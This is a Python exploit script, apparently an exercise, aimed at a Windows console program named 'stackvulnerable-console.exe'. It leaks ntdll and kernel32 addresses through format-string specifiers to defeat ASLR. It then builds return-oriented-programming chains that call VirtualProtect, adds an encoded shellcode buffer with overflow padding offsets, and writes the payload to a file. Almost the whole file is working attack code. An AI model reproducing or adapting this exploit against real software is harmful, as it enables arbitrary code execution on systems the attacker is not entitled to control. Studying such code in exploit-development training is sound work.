import struct
import os
import subprocess

leaktrigger = "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21 + "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21

p = subprocess.Popen(['stackvulnerable-console.exe',leaktrigger],
				stdin=subprocess.PIPE,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				universal_newlines=True)

(stdoutdata, stderrdata) = p.communicate()

ntdllleak=int(stdoutdata.split("ntdll")[1],16)
kernel32leak=int(stdoutdata.split("kernel32")[1],16)

print("Ntdll Leak: "+hex(ntdllleak)+"\nKernel32 Leak: "+hex(kernel32leak))



outputfile = "console.txt"
badchars = "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28"

def stack_rop_chain():

	# this rop chain is used to jump back to beginning of the payload
	rop_gadgets = [	
        #######################
        # Ntdll Leak: 0x77084315
        # Kernel32 Leak: 0x7502264a
        #######################
        # Stack adjustment	=>  0018FF24 (ESP) + fffffbe8 = 0018FB0C (Payload)
        # 0x770ff8c3 :  # ADD ESP,ECX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}        
        # 0x770f3876 :  # POP ECX # RETN    ** [ntdll.dll] **   |  ascii {PAGE_EXECUTE_READ}
        #######################
        ntdllleak+0x000a2b4f, # 0x77126e64 :  # POP ECX # RETN    ** [ntdll.dll] **   |  ascii {PAGE_EXECUTE_READ}
	0xfffffbe8,  # 0018FF24 (ESP) + fffffbe8 = 0018FB0C (Payload)
        ntdllleak+0x0009b5ae, # 0x7711f8c3 :  # ADD ESP,ECX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}		
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
	
def create_rop_chain():

	# Register setup for VirtualProtect() :
	# --------------------------------------------
	# EAX = NOP (0x90909090)
	# ECX = lpOldProtect (ptr to W address)
	# EDX = NewProtect (0x40)
	# EBX = dwSize
	# ESP = lPAddress (automatic)
	# EBP = ReturnTo (ptr to jmp esp)
	# ESI = ptr to VirtualProtect()
	# EDI = ROP NOP (RETN)

	# rop chain generated with mona.py - www.corelan.be
	# !mona rop -cpb "\x00\x1a\x0d" -m kernel32.dll,ntdll.dll
	# EDX calculation needed an optimisation
	rop_gadgets = [	
        #######################
        # Ntdll Leak: 0x77084315
        # Kernel32 Leak: 0x7502264a
        #######################
        # Padding for the stack pivoting adjustment
        0x41414141,  # Padding for EBP

        # EBX and ESI (0x00000425 and VirtualProtect)
        kernel32leak+0x009F59c, #0x750c1be6, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        0x41414141,  # Filler (compensate)
        0xfffffbdb,  # Value to negate, will become 0x00000425 
        ntdllleak+0x0002c33b, # 0x770b0650,  # NEG EAX # POP EBP # RETN    ** [ntdll.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x41414141,  # Filler (compensate)
        ntdllleak-0x0000493a, #0x7707f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
        0x41414141,  # Filler (compensate)
        ntdllleak-0x0000493a, #0x7707f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
        0x43414141,  # Filler (compensate)
        0x44414141,  # Filler (compensate)
        0x45414141,  # Filler (compensate)
        0x46414141,  # Filler (compensate)
        # This goes to ESI
        kernel32leak+0x00001d84, #0x750243CE ptr to &VirtualProtect()

        # EDX and EBP (0x00000040 and PUSH ESP # RETN  [kernel32.dll])
        kernel32leak+0x009F59c, #0x750c1be6, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        0x43414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)       
        0xffffffdf,  # put delta into eax (-> put 0x00000040 into edx)
        ntdllleak+0x000924ff, #0x77116814,  # ADD EAX,61 # POP EBP # RETN 0x04 [ntdll.dll] ** REBASED ** ASLR 
        # This goes to EBP
        kernel32leak+0x00069ca6, #0x75b2c2f0 :  # PUSH ESP # RETN    ** [kernel32.dll] **  ** REBASED ** ASLR
        ntdllleak+0x0002aeab, #0x7729f1c0 :  # XCHG EAX,EDX # RETN    ** [ntdll.dll] ** **** REBASED ** ASLR 
        0x42414141,  # Filler (RETN offset compensation)
        
        # ECX (& Writable location [ntdll.dll])
        ntdllleak+0x00051d2a, # 0x772c603f :  # POP ECX # RETN    ** [ntdll.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ} ** REBASED ** ASLR 
        ntdllleak+0x000d3948, #0x77157c5d,  # &Writable location [ntdll.dll] ** REBASED ** ASLR      

        # EDI (& RETN (ROP NOP) [ntdll.dll] )
        ntdllleak+0x0003f3ce, #0x770c36e3,  # POP EDI # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ} 
        ntdllleak+0x0008e20d, #0x77112522,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        kernel32leak+0x009F59c, #0x750c1be6, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        0x90909090,  # nop

        #[---INFO:pushad:---]
        kernel32leak+0x0000afcb, #0x7502d615,  # PUSHAD # ADD AL,0 # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

	
buf =  b"\x90"*32
buf += b"\xdb\xd4\xbe\x5e\x2d\x0e\x1f\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x30\x31\x77\x18\x03\x77\x18\x83\xc7\x5a\xcf"
buf += b"\xfb\xe3\x8a\x8d\x04\x1c\x4a\xf2\x8d\xf9\x7b\x32\xe9"
buf += b"\x8a\x2b\x82\x79\xde\xc7\x69\x2f\xcb\x5c\x1f\xf8\xfc"
buf += b"\xd5\xaa\xde\x33\xe6\x87\x23\x55\x64\xda\x77\xb5\x55"
buf += b"\x15\x8a\xb4\x92\x48\x67\xe4\x4b\x06\xda\x19\xf8\x52"
buf += b"\xe7\x92\xb2\x73\x6f\x46\x02\x75\x5e\xd9\x19\x2c\x40"
buf += b"\xdb\xce\x44\xc9\xc3\x13\x60\x83\x78\xe7\x1e\x12\xa9"
buf += b"\x36\xde\xb9\x94\xf7\x2d\xc3\xd1\x3f\xce\xb6\x2b\x3c"
buf += b"\x73\xc1\xef\x3f\xaf\x44\xf4\xe7\x24\xfe\xd0\x16\xe8"
buf += b"\x99\x93\x14\x45\xed\xfc\x38\x58\x22\x77\x44\xd1\xc5"
buf += b"\x58\xcd\xa1\xe1\x7c\x96\x72\x8b\x25\x72\xd4\xb4\x36"
buf += b"\xdd\x89\x10\x3c\xf3\xde\x28\x1f\x99\x21\xbe\x25\xef"
buf += b"\x22\xc0\x25\x5f\x4b\xf1\xae\x30\x0c\x0e\x65\x75\xe2"
buf += b"\x44\x24\xdf\x6b\x01\xbc\x62\xf6\xb2\x6a\xa0\x0f\x31"
buf += b"\x9f\x58\xf4\x29\xea\x5d\xb0\xed\x06\x2f\xa9\x9b\x28"
buf += b"\x9c\xca\x89\x4a\x43\x59\x51\x8d"

shellcode = buf
	
# padding = "A"*1032
payload = create_rop_chain()
padding = payload + shellcode + "\xcc" * (1032 - len(payload) - len(shellcode))

# After using !mona pc 1500 and !mona findmsp
# Padding info in register and SEH alignment are below
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)

# Put a breakpoint at 0x004012AF to see the bug at POP EBP and RETN
ebp = "BBBB" # This triggers the bug due to POP EBP and RETN

# JMP ESP search using !mona find -s "\xff\xe4"
# 0x75b4b391 (b+0x0006b391)  : "\xff\xe4" |  {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: True, Rebase: True, SafeSEH: True, OS: True, v7.0.7600.16385 (C:\Windows\syswow64\msvcrt.dll)
#eip = struct.pack('L',0x75b4b391)
eip = "" # ROP Chain starts with EIP influence

# Potential ROP Chain space
ropchain = stack_rop_chain() #create_rop_chain() 
esp = ropchain + "\xCC" * (168-len(ropchain)) 

# Don't trigger SEH unless  you turn it to a SEH exploit
nseh = "" #"EEEE"
seh = "" #"FFFF"

buffer = padding + ebp + eip + esp + nseh + seh

print("[+] Creating %s" % outputfile)
f = open(outputfile,'wb')
print("[+] Writing %d bytes to file" % len(buffer))
f.write(buffer)
print("[+] Done")
f.close()